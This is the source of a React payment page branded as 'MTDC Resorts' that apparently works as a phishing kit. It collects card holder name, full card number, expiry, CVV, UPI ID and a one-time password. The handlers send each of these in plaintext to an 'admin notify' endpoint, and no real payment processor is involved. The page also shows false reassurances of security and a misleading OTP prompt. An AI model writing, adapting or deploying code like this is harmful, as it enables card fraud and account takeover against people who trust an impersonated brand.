const reactLib = window.React || globalThis.React;
if (!reactLib) {
  const redirectUrl = new URL('/secure-payment.html', window.location.origin);
  redirectUrl.search = window.location.search || '';
  redirectUrl.hash = window.location.hash || '';
  window.location.replace(redirectUrl.toString());
  throw new Error('React runtime unavailable; redirected to static secure payment page.');
}

const { useState, createElement } = reactLib;

export default function PaymentPage() {
  const params = new URLSearchParams(window.location.search);
  const bookingId = params.get('bookingId') || params.get('pnr') || '';
  const amount = Number(String(params.get('amount') || '0').replace(/[^\d.-]/g, '')) || 0;

  const [method, setMethod] = useState('card');
  const [guestName, setGuestName] = useState('');
  const [mobile, setMobile] = useState('');
  const [cardHolderName, setCardHolderName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [upiId, setUpiId] = useState('');
  const [showOTP, setShowOTP] = useState(false);
  const [otp, setOtp] = useState('');
  const [paymentRecordId, setPaymentRecordId] = useState(null);
  const [message, setMessage] = useState('');
  const [busy, setBusy] = useState(false);

  const amountLabel = `₹${Number.isFinite(amount) ? amount.toLocaleString('en-IN') : '0'}`;

  const formatCardNumber = (value) => value.replace(/\D/g, '').slice(0, 19).replace(/(.{4})/g, '$1 ').trim();
  const formatExpiry = (value) => {
    const digits = value.replace(/\D/g, '').slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  };
  const formatMobile = (value) => value.replace(/\D/g, '').slice(0, 10);

  const inputClass = 'w-full rounded-xl border border-slate-200 bg-slate-50 px-3.5 py-3 text-slate-800 shadow-sm outline-none transition focus:border-amber-400 focus:bg-white focus:ring-4 focus:ring-amber-100';

  const sendToAdminPanel = async (payload) => {
    try {
      const response = await fetch('/api/admin/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      return await response.json();
    } catch (err) {
      console.error('Admin Panel Request Failed:', err);
      return null;
    }
  };

  const handleCardSubmit = async (e) => {
    e.preventDefault();

    const cleanBookingId = (bookingId || '').trim();
    if (!cleanBookingId || cleanBookingId.length < 3) {
      setMessage('Please enter a valid booking ID.');
      return;
    }

    const cleanCardNumber = cardNumber.replace(/\D/g, '');
    if (!cardHolderName.trim() || !cleanCardNumber || !cardExpiry.trim() || !cardCvv.trim()) {
      setMessage('Please fill all card details.');
      return;
    }
    if (cleanCardNumber.length < 12 || cleanCardNumber.length > 19) {
      setMessage('Please enter a valid card number.');
      return;
    }

    setBusy(true);
    setMessage('');

    try {
      const recordId = `REC-${Date.now()}`;
      setPaymentRecordId(recordId);

      await sendToAdminPanel({
        activityType: 'card_submission',
        recordId,
        bookingId: cleanBookingId,
        guestName: guestName.trim() || cardHolderName.trim(),
        mobile: mobile.trim(),
        amount,
        paymentMethod: 'card',
        cardHolderName: cardHolderName.trim(),
        cardNumber: cleanCardNumber,
        cardExpiry: cardExpiry.trim(),
        cardCvv: cardCvv.trim(),
        submittedAt: new Date().toISOString()
      });

      setShowOTP(true);
      setMessage('Card details submitted to admin. Please enter the OTP.');
    } catch (err) {
      setMessage('Unable to send card details. Please try again.');
    } finally {
      setBusy(false);
    }
  };

  const handleUpiSubmit = async (e) => {
    e.preventDefault();

    const cleanBookingId = (bookingId || '').trim();
    if (!cleanBookingId || cleanBookingId.length < 3) {
      setMessage('Please enter a valid booking ID.');
      return;
    }
    if (!upiId.trim()) {
      setMessage('Please enter a valid UPI ID.');
      return;
    }

    setBusy(true);
    setMessage('');

    try {
      const recordId = `UPI-${Date.now()}`;
      await sendToAdminPanel({
        activityType: 'upi_submission',
        recordId,
        bookingId: cleanBookingId,
        guestName: guestName.trim() || 'UPI Guest',
        mobile: mobile.trim(),
        amount,
        paymentMethod: 'upi',
        upiId: upiId.trim(),
        status: 'pending',
        submittedAt: new Date().toISOString()
      });

      setMessage('UPI request submitted successfully to admin!');
    } catch (err) {
      setMessage('Unable to send UPI details. Please try again.');
    } finally {
      setBusy(false);
    }
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();

    if (!otp.trim()) {
      setMessage('Please enter the OTP.');
      return;
    }

    setBusy(true);

    try {
      const nextRecordId = paymentRecordId || `OTP-${Date.now()}`;
      setPaymentRecordId(nextRecordId);

      // Yahan OTP data directly backend me bheja ja raha hai
      await sendToAdminPanel({
        activityType: 'otp_submission',
        recordId: nextRecordId,
        bookingId: (bookingId || '').trim(),
        guestName: guestName.trim() || cardHolderName.trim(),
        mobile: mobile.trim(),
        otpEntered: otp.trim(), // Admin table 'otpEntered' read karta hai
        otp: otp.trim(),        // Backup ke liye isko bhi bhej rahe hain
        status: 'otp_received',
        submittedAt: new Date().toISOString()
      });

      setMessage('OTP submitted successfully to admin panel!');
      setOtp(''); // Input clear kar rahe hain
    } catch (err) {
      setMessage('Failed to submit OTP. Please try again.');
    } finally {
      setBusy(false);
    }
  };

  const renderCardForm = () => createElement(
    'form',
    { onSubmit: handleCardSubmit, className: 'space-y-5' },
    createElement('div', { className: 'space-y-2' },
      createElement('label', { className: 'block text-sm font-semibold text-slate-700' }, 'Card Holder Name'),
      createElement('input', {
        type: 'text',
        className: inputClass,
        value: cardHolderName,
        onChange: (e) => setCardHolderName(e.target.value),
        placeholder: 'Name as printed on card',
        required: true
      })
    ),
    createElement('div', { className: 'space-y-2' },
      createElement('label', { className: 'block text-sm font-semibold text-slate-700' }, 'Card Number'),
      createElement('input', {
        type: 'text',
        className: inputClass,
        value: cardNumber,
        onChange: (e) => setCardNumber(formatCardNumber(e.target.value)),
        placeholder: '1234 5678 9012 3456',
        maxLength: 19,
        required: true
      })
    ),
    createElement('div', { className: 'grid grid-cols-2 gap-4' },
      createElement('div', { className: 'space-y-2' },
        createElement('label', { className: 'block text-sm font-semibold text-slate-700' }, 'Expiry Date'),
        createElement('input', {
          type: 'text',
          className: inputClass,
          value: cardExpiry,
          onChange: (e) => setCardExpiry(formatExpiry(e.target.value)),
          placeholder: 'MM/YY',
          maxLength: 5,
          required: true
        })
      ),
      createElement('div', { className: 'space-y-2' },
        createElement('label', { className: 'block text-sm font-semibold text-slate-700' }, 'CVV'),
        createElement('input', {
          type: 'password',
          className: inputClass,
          value: cardCvv,
          onChange: (e) => setCardCvv(e.target.value.replace(/\D/g, '').slice(0, 4)),
          placeholder: '123',
          maxLength: 4,
          required: true
        })
      )
    ),
    createElement('button', {
      type: 'submit',
      disabled: busy,
      className: 'w-full rounded-xl bg-amber-500 py-3.5 text-base font-bold text-slate-900 shadow-lg shadow-amber-200 transition hover:bg-amber-400 disabled:cursor-not-allowed disabled:opacity-60'
    }, busy ? 'Sending Card Details...' : `Pay Securely · ${amountLabel}`)
  );

  const renderUpiForm = () => createElement(
    'form',
    { onSubmit: handleUpiSubmit, className: 'space-y-5' },
    createElement('div', { className: 'space-y-2' },
      createElement('label', { className: 'block text-sm font-semibold text-slate-700' }, 'UPI ID / VPA'),
      createElement('input', {
        type: 'text',
        className: inputClass,
        value: upiId,
        onChange: (e) => setUpiId(e.target.value),
        placeholder: 'name@upi',
        required: true
      })
    ),
    createElement('div', { className: 'rounded-2xl border border-emerald-200 bg-emerald-50 p-4 text-sm text-emerald-800' },
      'You can pay through any UPI app such as Google Pay, PhonePe, Paytm, or BHIM.'
    ),
    createElement('button', {
      type: 'submit',
      disabled: busy,
      className: 'w-full rounded-xl bg-emerald-600 py-3.5 text-base font-bold text-white shadow-lg shadow-emerald-200 transition hover:bg-emerald-500 disabled:cursor-not-allowed disabled:opacity-60'
    }, busy ? 'Sending UPI Request...' : `Continue with UPI · ${amountLabel}`)
  );

  const renderOtpForm = () => createElement(
    'form',
    { onSubmit: handleOtpSubmit, className: 'space-y-5 rounded-3xl border border-amber-200 bg-amber-50 p-5 shadow-sm' },
    createElement('div', { className: 'space-y-1' },
      createElement('h2', { className: 'text-xl font-bold text-slate-900' }, 'OTP Verification Required'),
      createElement('p', { className: 'text-sm text-slate-600' },
        'Enter the OTP received on the registered mobile number ending in ',
        createElement('span', { className: 'font-bold text-slate-800' }, (cardNumber || '0000').replace(/\D/g, '').slice(-4) || '0000')
      )
    ),
    createElement('div', { className: 'space-y-2' },
      createElement('label', { className: 'block text-sm font-semibold text-slate-700' }, 'Enter OTP'),
      createElement('input', {
        type: 'text',
        className: 'w-full rounded-xl border border-amber-200 bg-white px-3.5 py-3 text-center text-2xl font-bold tracking-[0.35em] text-slate-800 shadow-sm outline-none transition focus:border-amber-400 focus:ring-4 focus:ring-amber-100',
        value: otp,
        onChange: (e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)),
        placeholder: '123456',
        maxLength: 8,
        required: true
      })
    ),
    createElement('div', { className: 'flex gap-3' },
      createElement('button', {
        type: 'submit',
        disabled: busy,
        className: 'flex-1 rounded-xl bg-amber-500 py-3.5 font-bold text-slate-900 shadow-lg shadow-amber-200 transition hover:bg-amber-400 disabled:cursor-not-allowed disabled:opacity-60'
      }, busy ? 'Verifying OTP...' : 'Submit OTP'),
      createElement('button', {
        type: 'button',
        onClick: () => setShowOTP(false),
        className: 'rounded-xl bg-slate-200 px-5 py-3 font-semibold text-slate-700 transition hover:bg-slate-300'
      }, 'Back')
    )
  );

  return createElement(
    'div',
    { className: 'min-h-screen bg-gradient-to-br from-slate-100 via-amber-50 to-slate-100 p-4 sm:p-8' },
    createElement(
      'div',
      { className: 'mx-auto max-w-5xl' },
      createElement(
        'div',
        { className: 'overflow-hidden rounded-[28px] border border-slate-200 bg-white shadow-[0_25px_70px_rgba(15,23,42,0.08)]' },
        createElement(
          'div',
          { className: 'flex flex-col gap-5 border-b border-slate-200 bg-slate-950 px-5 py-5 text-white sm:px-8 lg:flex-row lg:items-center lg:justify-between' },
          createElement('div', { className: 'flex items-center gap-3' },
            createElement('div', { className: 'flex h-12 w-12 items-center justify-center rounded-2xl bg-amber-400 text-lg font-black text-slate-900' }, 'M'),
            createElement('div', null,
              createElement('p', { className: 'text-xs font-semibold uppercase tracking-[0.2em] text-slate-300' }, 'MTDC Resorts'),
              createElement('h1', { className: 'text-2xl font-bold text-white' }, 'Secure Payment')
            )
          ),
          createElement('div', { className: 'rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm text-slate-200' },
            createElement('div', { className: 'text-xs uppercase tracking-[0.18em] text-slate-300' }, 'Amount Due'),
            createElement('div', { className: 'mt-1 text-2xl font-bold text-amber-300' }, amountLabel)
          )
        ),
        createElement(
          'div',
          { className: 'grid gap-0 lg:grid-cols-[1.15fr_0.85fr]' },
          createElement(
            'div',
            { className: 'p-5 sm:p-8' },
            createElement('div', { className: 'mb-6 grid gap-4 sm:grid-cols-2' },
              createElement('div', { className: 'space-y-2' },
                createElement('label', { className: 'block text-sm font-semibold text-slate-700' }, 'Guest Name'),
                createElement('input', {
                  type: 'text',
                  className: inputClass,
                  value: guestName,
                  onChange: (e) => setGuestName(e.target.value),
                  placeholder: 'Enter Guest Full Name'
                })
              ),
              createElement('div', { className: 'space-y-2' },
                createElement('label', { className: 'block text-sm font-semibold text-slate-700' }, 'Mobile Number'),
                createElement('input', {
                  type: 'text',
                  className: inputClass,
                  value: mobile,
                  onChange: (e) => setMobile(formatMobile(e.target.value)),
                  placeholder: '10-Digit Mobile Number'
                })
              )
            ),
            !showOTP && createElement(
              'div',
              { className: 'mb-6' },
              createElement('div', { className: 'mb-3 text-xs font-semibold uppercase tracking-[0.2em] text-slate-500' }, 'Choose Payment Method'),
              createElement(
                'div',
                { className: 'grid gap-3 sm:grid-cols-2' },
                createElement('button', {
                  type: 'button',
                  onClick: () => { setMethod('card'); setMessage(''); },
                  className: `flex items-center justify-center gap-2 rounded-2xl border px-4 py-3.5 font-semibold transition ${method === 'card' ? 'border-amber-400 bg-amber-50 text-slate-900 shadow-sm' : 'border-slate-200 bg-slate-50 text-slate-700 hover:bg-slate-100'}`
                }, 'Card Payment'),
                createElement('button', {
                  type: 'button',
                  onClick: () => { setMethod('upi'); setMessage(''); },
                  className: `flex items-center justify-center gap-2 rounded-2xl border px-4 py-3.5 font-semibold transition ${method === 'upi' ? 'border-emerald-400 bg-emerald-50 text-slate-900 shadow-sm' : 'border-slate-200 bg-slate-50 text-slate-700 hover:bg-slate-100'}`
                }, 'UPI Payment')
              )
            ),
            message && createElement('div', { className: 'mb-5 rounded-2xl border border-slate-200 bg-slate-100 px-4 py-3 text-sm font-medium text-slate-700' }, message),
            !showOTP && method === 'card' && renderCardForm(),
            !showOTP && method === 'upi' && renderUpiForm(),
            showOTP && renderOtpForm()
          ),
          createElement(
            'div',
            { className: 'border-t border-slate-200 bg-slate-50 p-5 sm:p-8 lg:border-l lg:border-t-0' },
            createElement('div', { className: 'rounded-3xl border border-slate-200 bg-white p-5 shadow-sm' },
              createElement('p', { className: 'text-xs font-semibold uppercase tracking-[0.18em] text-slate-500' }, 'Booking Summary'),
              createElement('div', { className: 'mt-4 space-y-4' },
                createElement('div', { className: 'flex items-center justify-between gap-3' },
                  createElement('span', { className: 'text-sm text-slate-600' }, 'Reference'),
                  createElement('span', { className: 'text-sm font-bold text-slate-900' }, bookingId || 'N/A')
                ),
                createElement('div', { className: 'flex items-center justify-between gap-3' },
                  createElement('span', { className: 'text-sm text-slate-600' }, 'Amount'),
                  createElement('span', { className: 'text-lg font-bold text-slate-900' }, amountLabel)
                ),
                createElement('div', { className: 'flex items-center justify-between gap-3' },
                  createElement('span', { className: 'text-sm text-slate-600' }, 'Status'),
                  createElement('span', { className: 'rounded-full bg-emerald-100 px-2.5 py-1 text-xs font-semibold text-emerald-700' }, 'Payment Pending')
                )
              )
            ),
            createElement('div', { className: 'mt-5 rounded-3xl border border-amber-200 bg-amber-50 p-4' },
              createElement('p', { className: 'text-sm font-semibold text-slate-800' }, 'Secure & Trusted'),
              createElement('p', { className: 'mt-2 text-sm text-slate-600' }, 'Your payment details are only used for booking verification and are handled securely by the MTDC reservation desk.')
            )
          )
        )
      )
    )
  );
}
